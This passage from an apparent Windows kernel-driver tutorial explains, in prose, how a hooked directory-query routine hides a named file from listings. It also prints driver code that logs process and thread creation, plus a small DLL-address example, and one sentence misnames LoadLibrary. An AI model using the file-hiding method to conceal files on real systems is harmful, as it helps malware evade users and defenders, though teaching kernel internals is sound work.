<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Instead
of setting the NextEntryOffset of the previous guy and bypassing ourselves, why
not simply remove ourselves from the list by copying all the next structures
over us. Thus we will copy the next structure over us, the next next over the
next and so on. The RtlCopyMemory is a memcpy for the device driver world. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
start with the destination which is the match file name structure, the source
is the current structure to which we add the offset to get at the next
structure from where we are. Thus we are copying from one structure ahead of
the match file name to the match file name structure starting point. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
iLeft variable which we just computed is the amount to copy which is the amount
we have already read minus the size of the current structure which we are on
right now. Thus when we find a match in the middle, we copy the next structures
from the match over the match structure thereby eliminating ourselves the match
file name totally. However now the size of the Buffer is not what the parameter
says it is. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
the first if statement is true, then we are on the last structure. The first
check is to check that p and the parameter FileInformationBuffer are the same.
If this is true, then there is only one item in the list. P and
FileInformationBuffer will be the for the first structure only. In English this
means that the we have only one file name in the list and this is the matching
filename. We cannot remove it from the list as it is the only one. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
return a value of 0x80000006 which signifies an error. This will make sure that
the final program that will get this buffer will not display its contents. Thus
we have not displayed the file name. There is nothing else that we can do
because we cannot set the Buffer to 0. If the else is true, it means that we
have found a match on the last structure and it is not the first. We do what we
did earlier, i.e. set the previous structure to 0. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>All’s
fine you say. The only problem is that when we use a query like dir calc*.* and
we have two files calc.exe and calc1.exe, both do not get displayed. The reason
being that its not our fault. When we specify a query like calc*.* with a
wildcard, the parameter PathMask now becomes non zero and you will see its
value is calc*.* if you display the Buffer member. The problem is that the
function NewZwQueryDirectoryFile gets called twice. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
first time with 1 structure calc.exe and then again with calc1.exe. The first
time as it is the only one in the list we return a error. Thus the calling
program does not bother to call function ZwQueryDirectoryFile again and we see
no files names displayed. We scratched our heads but could come up with no
solution. We tries to zero out the structure, the entry yet gets displayed. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
date which we will do later is of the 17<sup>th</sup> century and no file name
gets displayed. We realized it is better to live with this bug.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P68<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
gProcessNameOffset;PEPROCESS curproc;int i;char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
NotifyNow (HANDLE<span style="mso-spacerun: yes">  </span>ParentId,HANDLE<span
style="mso-spacerun: yes">  </span>ProcessId,BOOLEAN<span style="mso-spacerun:
yes">  </span>Create)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PsLookupProcessByProcessId
((ULONG)ProcessId, &amp;curproc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (char *)curproc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Parent=%d
Pid=%d Create=%d CurProc=%x&quot;,ParentId,ProcessId,Create,curproc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( Create == 1)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
+= gProcessNameOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s&quot;,p);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
ProcessUnload(IN PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PsSetCreateProcessNotifyRoutine(NotifyNow,1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;ProcessUnload&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curproc
= PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 3*PAGE_SIZE; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
!strncmp(&quot;System&quot;, (PCHAR) curproc + i, strlen(&quot;System&quot;)))<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gProcessNameOffset
= i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay3
%d&quot;,gProcessNameOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PsSetCreateProcessNotifyRoutine
(NotifyNow,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DriverObject-&gt;DriverUnload
= ProcessUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return
STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
device driver guys at Microsoft gave us a simple function
PsSetCreateProcessNotifyRoutine that may have a long name but simply calls a function
of our choice each time we either start a process or shut it down. Thus in our
case it will call a function NotifyNow, the 0 following is to add this function
to the list of callback function names maintained internally. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
function ProcessUnload we use a 1 which means remove the function name from the
list. We also find the offset of the function name from the EPROCESS
structure.<span style="mso-spacerun: yes">  </span>Thus each time a process
gets created or shut down, the function NotifyNow is called with three
parameters. The last is 1 or 0, 1 signifying a process is being created. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
first two parameters are handles of the current process and the parent process.
Handles are opaque and of no use to us. We use the undocumented function
PsLookupProcessByProcessId which given a handle converts it in to a EPROCESS
pointer. We then display the name of the process only if the last parameter
Create is 1 as when it is zero there is no name. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
we are only notified<span style="mso-spacerun: yes">  </span>whenever a process
is being created or dying. We can not stop or influence anything.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P69<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
gProcessNameOffset;PEPROCESS curproc;int i;char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
NotifyNow (HANDLE<span style="mso-spacerun: yes">  </span>ProcessId,HANDLE<span
style="mso-spacerun: yes">  </span>ThreadId,BOOLEAN<span style="mso-spacerun:
yes">  </span>Create)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PsLookupProcessByProcessId
((ULONG)ProcessId, &amp;curproc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (char *)curproc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Pid=%d
Create=%d CurProc=%x ThreadID=%d&quot;,ProcessId,Create,curproc,ThreadId);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( Create == 1)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
+= gProcessNameOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s&quot;,p);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
ProcessUnload(IN PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PsSetCreateProcessNotifyRoutine(NotifyNow,1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;ProcessUnload&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>curproc
= PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 3*PAGE_SIZE; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
!strncmp(&quot;System&quot;, (PCHAR) curproc + i, strlen(&quot;System&quot;)))<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gProcessNameOffset
= i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay3
%d&quot;,gProcessNameOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PsSetCreateThreadNotifyRoutine(NotifyNow);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DriverObject-&gt;DriverUnload
= ProcessUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return
STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Pid=1420
Create=1 CurProc=81af6d60 ThreadID=1308<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>getright.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Pid=1276
Create=1 CurProc=81b2e860 ThreadID=1132<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>mcvsshld.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Pid=440
Create=1 CurProc=81ec8780 ThreadID=1140<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>svchost.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Most
of the above program remains the same other than one new function
PsSetCreateThreadNotifyRoutine. This function unlike the previous one takes
only one parameter the name of the callback function to be called. Thus we are
not allowed to unload such a driver until we shut the system down. The thread
callback function gets called with three parameters two the same as before and
the third is the thread id. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
we look at the output we can see which process is creating or deleting a
thread. We did what we asked you not to do, run y –u. The Blue Screen of Death
happened. The system was kind enough to tell us that the offending driver was
vijay.sys and also that we should not have unloaded our driver as there were
operations pending. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
only problem was that when we rebooted, this chapter disappeared from the face
of the earth. Fortunately for us, there was a funny looking temp file which we
renamed to chap3 and we got back our work lost. So please do not unload the
driver as God only knows what will happen.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE
i,j;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>i
= GetModuleHandle (&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>j
= LoadLibrary(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;%x
%x&quot;,i,j);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>77f80000
77f80000<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>There
are two ways we know of knowing where a dll is loaded in memory. The function
GetModuleHandle returns the address of the dll in memory whereas function
GetModuleHandle will load the dll in memory if not loaded and then return to us
